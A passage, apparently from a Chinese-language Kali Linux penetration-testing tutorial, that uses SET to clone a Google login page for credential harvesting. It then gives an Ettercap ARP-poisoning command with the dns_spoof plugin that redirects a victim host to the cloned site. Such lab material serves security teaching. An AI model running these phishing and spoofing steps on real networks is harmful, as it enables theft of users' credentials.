    \ `SET` 提供的 Web 模板。\n\n因此，输入数字 `1`，将显示以下信息：\n\n```\nset:webattack>1 [192.168.29.129]:\
    \ 192.168.29.139\n```\n\n此时指定 IP 地址以获取目标用户提交的信息，即攻击主机 `Kali` 的地址。\n\n在输入上述地址后，将显示以下信息：\n\
    \n1. 需要 Java\n2. Google\n3. Twitter\n\n```\nset:webattack> Select a template:\n\
    ```\n\n以上输出信息显示了 `SET` 默认提供的几个模板，包括 `Java Required`、`Google` 和 `Twitter`。\n\n\
    5) 此处选择了 `Google` 模板，因此输入数字 `2`，将显示以下信息：\n\n```\nset:webattack> Select a template:2\n\
    ```\n\n## B) 使用 Ettercap 启动 ARP 攻击\n\n1) 启动 `dns_spoof` 插件实施 DNS 欺骗。\n\n执行命令如下：\n\
    \n```\nroot@exampleserver:～# ettercap -Tq -M arp:remote -P dns_spoof /192.168.29.139//\
    \ /192.168.29.2//\n```\n\n2) 看到上面的输出信息表示 DNS 欺骗已成功实施。此时，当目标主机访问任何网页时，它将被诱骗进入攻击主机（192.168.29.139）创建的伪页面，即克隆站点。\n\
